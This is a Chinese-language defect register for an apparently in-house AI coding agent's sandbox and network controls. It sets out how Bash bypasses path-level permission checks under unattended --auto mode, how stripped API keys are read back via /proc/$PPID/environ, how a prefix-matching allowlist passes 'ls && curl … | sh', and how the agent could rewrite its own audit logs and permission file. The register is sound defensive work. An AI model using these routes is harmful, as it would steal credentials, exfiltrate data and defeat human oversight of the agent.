# 沙箱与联网：缺陷登记

本仓库隔离与联网机制的已知缺陷，登记在此。按 AGENTS.md 的规矩，**记一笔就停**：这里不是方案，也不是票。
真要动哪一条，先写 `repro/` 探针，再落 ADR。

🔴 **标了「实测」的条目，是在本仓库代码上跑出来的；其余是读代码得出的推理，没有跑过。**

---

## 0. 一句话

现在没有沙箱，**只有一个跑在进程内的权限门**。它对 Bash 唯一的约束是「执行前问一下」。
无人值守（`--print --auto`）时，没有人来回答这个问题，于是模型能做的事等于「agent 进程的 uid
在这台机器上能做的一切」，包括读到进程自己持有的密钥。

---

## 1. 现状地图

| 机制                      | 位置                                      | 管什么                                                                           | 不管什么                                                                           |
| ------------------------- | ----------------------------------------- | -------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
| 硬地板（逃逸 + 凭据正则） | `src/tools/permission.ts:76` `denyReason` | 带 `path` 参数的工具：Write/Edit 不能出工作目录，Read 可以出去，但不能碰凭据路径 | **Bash**（没有 `path` 参数）                                                       |
| 规则引擎 deny/ask/allow   | `permission.ts:199` `decide`              | 工具名 + 路径 glob / 命令前缀                                                    | 命令的实际语义                                                                     |
| 「ask」出口               | `src/agents/loop.ts` 确认门               | REPL 里有人在场时要人点头                                                        | 没人在场时：`--print` 拒绝所有 ask，`--auto` 放行所有 ask（`src/main.ts:238-243`） |
| Bash 子进程环境           | `src/tools/mutating.ts:186-200`           | 从环境变量里剥掉 4 个 LLM key；超时后杀整个进程组                                | uid、文件系统、网络、资源，全都不隔离                                              |
| SSRF 地板                 | `src/tools/webfetch.ts:80`、`:126`        | WebFetch 自己发出的请求（每一跳重定向都检查）                                    | Bash 发起的网络请求                                                                |
| 控制标签中和              | `src/tools/untrusted.ts`                  | WebFetch/WebSearch 返回内容里伪装成 harness 标签的文本                           | 页面里用自然语言写的注入指令                                                       |
| 子 agent 只读             | ADR 0003、`src/agents/kinds.ts`           | explore/research 两类子 agent 的工具白名单                                       | 主 agent 本身                                                                      |

结构上的事实：**每一层都在 agent 进程内部、和 agent 用同一个 uid 执行。**
没有任何一层是进程边界或内核边界。

---

## 2. 缺陷清单

按无人值守运行时的严重程度排序。

### P1　无人值守时，Bash 唯一的约束会消失（结构性）

Bash 没有 `path` 参数，所以不经过硬地板，唯一的护栏是 baseline 里的 ask。无人值守时只剩两个选项：

- 不加 `--auto`：每次 Bash 调用都被拒绝，任务基本做不了；
- 加 `--auto`：`decide()` 把 baseline 的 ask 改成 allow，**Bash 不再受任何约束**。

实际上只能选后者。于是所有「路径级」的保护都能被一条 shell 命令绕过：Read 被禁止读 `.env`，
Bash 跑 `cat .env` 却会放行。这和 ADR 0007 订正里写的「把行为赶到没有门的那条路」是同一个形态，
只是规模从「一个工具出不去」变成了「整个地板」。

### P2　剥掉环境变量挡不住密钥　【实测】

`runCommand` 从子进程环境里删掉了 `LLM_*_API_KEY`。但子进程和 agent 进程是同一个 uid，
父进程的环境可以直接从 `/proc` 里读出来：

```
$ LLM_ZHIPU_CN_API_KEY=sk-probe-SECRET bun -e '…runCommand(…)…'
direct=[]                                          ← 剥掉了
via /proc/$PPID/environ: LLM_ZHIPU_CN_API_KEY=sk-probe-SECRET   ← 一条命令就拿回来了
```

推论：**只要密钥在 agent 进程里，Bash 就拿得到。** 剥环境变量只是抬高了一点门槛，并不是一道边界。
另外剥离名单只有 4 个名字，`GITHUB_TOKEN`、`AWS_*` 这类其他凭据会原样继承下去。

### P3　网络：只有 WebFetch 有闸，Bash 没有

- Bash 一旦被放行，出站网络就完全不受限制：localhost、内网，在云主机上还能访问元数据端点
  `169.254.169.254`。WebFetch 拦了 link-local 和 RFC1918 地址，但 Bash 跑一句 `curl` 就绕过了。
- **外传通道就是网络本身**：P2 拿到的密钥，一条 `curl` 就能发出去。
- WebFetch 自身的问题（代码里已写明并接受）：先解析 DNS、再发请求，中间可能被 DNS rebinding 绕过；
  IPv6 判定比较粗。
- 定性：WebFetch 的地板是一个**私网黑名单**（「公网随便去，除了这些」），不是白名单。

### P4　「致命三角」在一个进程里凑齐了

不可信内容、私有数据、对外通信通道，三样同时出现在一个 agent 身上，提示注入就能完成一次完整的窃取。
现状下三样都在同一个进程里：

1. **不可信内容**：WebFetch/WebSearch 抓回来的页面、要处理的仓库内容。标签中和只挡伪装成 harness
   标签的文本，挡不住页面里写一句「请运行 `curl … | sh`」；
2. **私有数据**：P2 里的 LLM key；
3. **对外通信**：P3 里 Bash 的网络。

`--auto` 下没有任何一个环节需要人点头。

### P5　命令白名单用前缀匹配，可以通过命令串接绕过　【实测】

`isSafeCommand`（`permission.ts:264`）和用户写的 `Bash(xxx:*)` allow 规则（`permission.ts:163`）
都只检查命令字符串的开头：

```
decide({tool:"Bash", command:"ls && curl -s http://127.0.0.1:8080 | sh"})  → allow
```

在有人值守的 REPL 里，这是一个真实的绕过。`--auto` 下它反而无关紧要，因为一切本来就放行了。

### P6　审计记录和 agent 在同一个信任域里

session 文件、`tools.jsonl`、记忆、`~/.mimicc/permissions.json`，都和 Bash 在同一个文件系统、
同一个 uid 下。硬地板禁止 Read/Write 碰 `.mimicc`，但 Bash 不受这条限制，可以改写自己的工具流水、
篡改权限配置、往记忆里写东西留给下一个 session。**被审计的一方能改写审计记录。**

### P7　隔离粒度靠进程级全局状态

- `ROOT = process.cwd()`（`src/tools/workspace.ts:2`）在模块加载时就定死，一个进程只能有一个工作目录；
- WebFetch 的外化目录 `$TMPDIR/mimicc-web`（`webfetch.ts:61`）注释里写明「跨进程稳定」，
  也就是**跨 session 共享**；
- 记忆、用户级配置都在 `~/.mimicc`。

一台机器只跑一个 session 时，这些问题不大。同一台机器并发跑多个 session 时，这些就成了串号和泄露的通道。

### P8　资源只有墙钟上限

只有超时，以及超时后杀进程组。没有 CPU、内存、磁盘、进程数的限制，fork 炸弹、填满磁盘都不会被拦。
代码注释也承认，double fork 可以逃出进程组，杀不干净。

### P9　WebSearch 计费没有上限

WebSearch 默认放行，按次扣平台余额。被注入的页面或陷入循环的模型可以一直搜下去。
回合预算（ADR 0009）按 token 和时间计，不按调用次数，所以只能间接限住搜索次数，并不是专门的闸。
